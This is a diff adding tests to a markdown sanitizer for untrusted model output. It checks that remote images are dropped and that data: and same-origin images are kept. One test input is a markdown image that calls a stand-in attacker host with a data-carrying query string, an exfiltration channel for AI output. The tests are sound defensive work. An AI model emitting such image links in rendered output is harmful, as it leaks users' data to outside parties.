@@ -68,3 +68,15 @@ describe("renderMarkdown — sanitizing untrusted model output", () => {
     expect(html).toContain("noopener");
   });
 });
+
+describe("remote images", () => {
+  it("drops a remote image (an exfiltration channel) but keeps its alt text", () => {
+    const html = renderMarkdown("![secret](https://evil.example/leak?d=42)");
+    expect(html).not.toContain("<img");
+    expect(html).toContain("[image: secret]");
+  });
+  it("keeps data: and same-origin images", () => {
+    expect(renderMarkdown("![a](data:image/png;base64,AAAA)")).toContain("<img");
+    expect(renderMarkdown("![a](/assets/x.png)")).toContain("<img");
+  });
+});
